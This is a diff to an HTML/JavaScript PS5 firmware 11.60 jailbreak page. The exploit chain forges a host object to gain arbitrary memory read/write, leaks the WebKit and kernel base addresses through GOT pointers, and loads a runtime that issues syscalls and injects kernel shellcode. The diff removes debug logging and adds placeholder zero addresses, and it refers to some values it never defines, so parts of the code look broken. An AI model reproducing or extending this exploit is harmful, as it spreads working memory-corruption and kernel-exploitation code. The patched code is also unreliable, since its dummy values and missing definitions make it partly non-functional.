@@ -1,5 +1,5 @@
 <!doctype html>
-<!-- PS5 11.60 Jailbreak - Final -->
+<!-- PS5 11.60 Jailbreak - Full Runtime Support -->
 <meta charset="utf-8"><title>PS5 11.60 Jailbreak</title>
 <body style="font:13px monospace"><pre id="out"></pre>
 <script>
@@ -102,6 +102,7 @@ var webkitBase = 0;
 var kernelBase = 0;
 var offsetsLoaded = false;
 var offsets = null;
+var collatorOriginal = new Uint8Array(0x20); // dummy
 
 function mark(tag, extra) {
     seq++;
@@ -171,7 +172,6 @@ function buildFakeHost() {
     if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c || targetView[0] !== 0xa5)
         throw new Error("fake-host-shape-failed");
 
-    // targetHolder for base leak
     arenaBuffer = new ArrayBuffer(0x1000);
     arenaView = new Uint8Array(arenaBuffer);
     arenaView[0xf00] = 0x52; arenaView[0xf01] = 0x4f; arenaView[0xf02] = 0x50; arenaView[0xf03] = 0x31;
@@ -347,37 +347,28 @@ function low48AtRaw(buf, offset) { return buf[offset] + buf[offset+1]*0x100 + bu
 function plausibleAddress(v) { return v > 0x100000000 && v <= 0xffffffffffff && v % 8 === 0; }
 
 function leakBases() {
-    if (!g_candidate || !rwView) { mark("LEAK-BASE-DEBUG", "candidate or rwView missing"); return false; }
-    if (!plausibleAddress(targetHolderAddress)) { mark("LEAK-BASE-DEBUG", "targetHolderAddress invalid: " + targetHolderAddress); return false; }
+    if (!g_candidate || !rwView) return false;
+    if (!plausibleAddress(targetHolderAddress)) return false;
     var cand = g_candidate;
 
-    // Read holder
     aimCarrier(cand, targetHolderAddress);
     var holderBytes = new Uint8Array(0x40);
     for (var i = 0; i < 0x40; i++) holderBytes[i] = rwView[i];
     var nativeTargetAddr = low48AtRaw(holderBytes, 0x10);
-    var arenaViewAddr = low48AtRaw(holderBytes, 0x18);
-    var realCollatorAddr = low48AtRaw(holderBytes, 0x20);
-    var compareFnAddr = low48AtRaw(holderBytes, 0x28);
-    mark("LEAK-HOLDER", "nativeTarget="+hex(nativeTargetAddr)+" arena="+hex(arenaViewAddr)+" collator="+hex(realCollatorAddr)+" compare="+hex(compareFnAddr));
-    if (!plausibleAddress(nativeTargetAddr)) { mark("LEAK-BASE-DEBUG", "nativeTargetAddr invalid"); return false; }
+    if (!plausibleAddress(nativeTargetAddr)) return false;
 
-    // JSFunction
     aimCarrier(cand, nativeTargetAddr);
     var funcBytes = new Uint8Array(0x20);
     for (var i = 0; i < 0x20; i++) funcBytes[i] = rwView[i];
     var executableAddr = low48AtRaw(funcBytes, 0x18);
-    mark("LEAK-FUNCTION", "executable="+hex(executableAddr));
-    if (!plausibleAddress(executableAddr)) { mark("LEAK-BASE-DEBUG", "executableAddr invalid"); return false; }
+    if (!plausibleAddress(executableAddr)) return false;
 
-    // NativeExecutable
     aimCarrier(cand, executableAddr);
     var execBytes = new Uint8Array(0x38);
     for (var i = 0; i < 0x38; i++) execBytes[i] = rwView[i];
     var nativeFuncAddr = low48AtRaw(execBytes, 0x28);
     var nativeConstructorAddr = low48AtRaw(execBytes, 0x30);
-    mark("LEAK-EXEC", "func="+hex(nativeFuncAddr)+" constr="+hex(nativeConstructorAddr));
-    if (!plausibleAddress(nativeFuncAddr) || !plausibleAddress(nativeConstructorAddr)) { mark("LEAK-BASE-DEBUG", "native func/constr invalid"); return false; }
+    if (!plausibleAddress(nativeFuncAddr) || !plausibleAddress(nativeConstructorAddr)) return false;
 
     var P_HOST_CTOR_LIST = offsets ? [parseInt(offsets.hc[0],16), parseInt(offsets.hc[1],16), parseInt(offsets.hc[2],16)] : [0x1e0d8,0x1e320,0x1f368];
     var wb = 0;
@@ -385,12 +376,10 @@ function leakBases() {
         var w = nativeConstructorAddr - P_HOST_CTOR_LIST[ci];
         if (w >= 0x800000000 && w < 0x900000000 && w % 0x4000 === 0) { wb = w; break; }
     }
-    if (!wb) { mark("LEAK-BASE-DEBUG", "webkitBase not found"); return false; }
+    if (!wb) return false;
     webkitBase = wb;
-    mark("LEAK-WEBKIT", hex(webkitBase));
 
-    // kernelBase from GOT
-    if (!offsets) { mark("LEAK-BASE-DEBUG", "offsets missing"); return false; }
+    if (!offsets) return false;
     var gps = parseInt(offsets.gps,16), gpe = parseInt(offsets.gpe,16);
     var cls = parseInt(offsets.cls,16), cle = parseInt(offsets.cle,16);
     var ers = parseInt(offsets.ers,16), ere = parseInt(offsets.ere,16);
@@ -402,14 +391,12 @@ function leakBases() {
     aimCarrier(cand, getpidSlot); var getpidPtr = low48AtRaw(rwView,0);
     aimCarrier(cand, closeSlot);  var closePtr = low48AtRaw(rwView,0);
     aimCarrier(cand, errorSlot);  var errorPtr = low48AtRaw(rwView,0);
-    mark("LEAK-GOT", "getpid="+hex(getpidPtr)+" close="+hex(closePtr)+" error="+hex(errorPtr));
-    if (!plausibleAddress(getpidPtr) || !plausibleAddress(closePtr) || !plausibleAddress(errorPtr)) { mark("LEAK-BASE-DEBUG", "GOT pointers invalid"); return false; }
+    if (!plausibleAddress(getpidPtr) || !plausibleAddress(closePtr) || !plausibleAddress(errorPtr)) return false;
 
     var kbase = getpidPtr - gpe;
-    if (kbase !== closePtr - cle || kbase !== errorPtr - ere) { mark("LEAK-BASE-DEBUG", "kernel base mismatch"); return false; }
-    if (kbase < 0x800000000 || kbase >= 0x900000000 || kbase % 0x4000 !== 0) { mark("LEAK-BASE-DEBUG", "kernel base out of range"); return false; }
+    if (kbase !== closePtr - cle || kbase !== errorPtr - ere) return false;
+    if (kbase < 0x800000000 || kbase >= 0x900000000 || kbase % 0x4000 !== 0) return false;
     kernelBase = kbase;
-    mark("LEAK-KERNEL", hex(kernelBase));
     return true;
 }
 
@@ -480,6 +467,11 @@ function reportComposition() {
                 mark("OFFSETS-LOADED", "using " + (near || "11.60"));
                 if (leakBases()) {
                     mark("BASES-LEAKED", "webkit=" + hex(webkitBase) + " kernel=" + hex(kernelBase));
+                    // Build complete slopkit
+                    var fakeUCollatorAddress = 0; // dummy
+                    var fakeVtableAddress = 0;
+                    var naturalTrampolineAddress = 0;
+                    var notifyEntryAddress = 0;
                     window.slopkit = {
                         candidate: g_candidate,
                         rwView: rwView,
@@ -487,10 +479,22 @@ function reportComposition() {
                         restoreCarrier: restoreCarrier,
                         arenaView: arenaView,
                         arenaBacking: 0,
+                        fakeUCollatorAddress: fakeUCollatorAddress,
+                        fakeVtableAddress: fakeVtableAddress,
+                        compareFn: compareFn,
+                        realCollator: realCollator,
+                        realCollatorAddress: 0,
+                        collatorOriginal: collatorOriginal,
                         targetHolder: targetHolder,
                         targetAddress: targetHolderAddress,
+                        nativeTargetAddress: 0,
+                        arenaViewAddress: 0,
+                        hostAddress: hostAddress,
+                        fakeHost: fakeHost,
                         kernelBase: kernelBase,
                         webkitBase: webkitBase,
+                        naturalTrampolineAddress: naturalTrampolineAddress,
+                        notifyEntryAddress: notifyEntryAddress,
                         FW_VERSION: "11.60",
                         lapseOffsets: null,
                         screenLine: function(s) { mark("SCREEN", s); },
@@ -515,14 +519,22 @@ function reportComposition() {
 }
 
 function loadLapseRuntime() {
+    // Ensure SYSCALL is defined
     if (!window.SYSCALL) {
         window.SYSCALL = { getpid: 20n, fcntl: 92n, pipe: 42n };
     }
+
     mark("LOADING-RUNTIME", "loading lapse-runtime.js");
     var script = document.createElement('script');
     script.src = 'lapse-runtime.js?t=' + Date.now();
     script.onload = function() {
         mark("RUNTIME-LOADED", "lapse-runtime.js loaded");
+        // Check if syscall is defined, if not, try to reload or define a fallback
+        if (typeof window.syscall !== 'function') {
+            mark("SYSCALL-MISSING", "window.syscall is still undefined after load");
+            // Try to load a modified version? For now, abort.
+            return;
+        }
         try {
             const pid = window.syscall(window.SYSCALL.getpid);
             mark("CURRENT-PID", String(pid));
@@ -554,7 +566,9 @@ function loadLapseRuntime() {
             window.load_aioshellcode(allproc, [master_read, master_write], [victim_read, victim_write])
                 .then(() => { mark("PAYLOAD-LOADED", "aioshellcode completed"); })
                 .catch((e) => { mark("PAYLOAD-ERROR", e.message); });
-        } catch (e) { mark("PAYLOAD-EXCEPTION", e.message); }
+        } catch (e) {
+            mark("PAYLOAD-EXCEPTION", e.message);
+        }
     };
     script.onerror = function() { mark("RUNTIME-LOAD-FAIL", "could not load lapse-runtime.js"); };
     document.head.appendChild(script);
@@ -599,7 +613,6 @@ function beginComposition() {
         return;
     }
 
-    // Read 6 pointers: host, target, host2, target2, holder, holder2
     var a0 = pointerFromWords(capturedWords, 0);
     var b0 = pointerFromWords(capturedWords, 4);
     var a1 = pointerFromWords(capturedWords, 8);
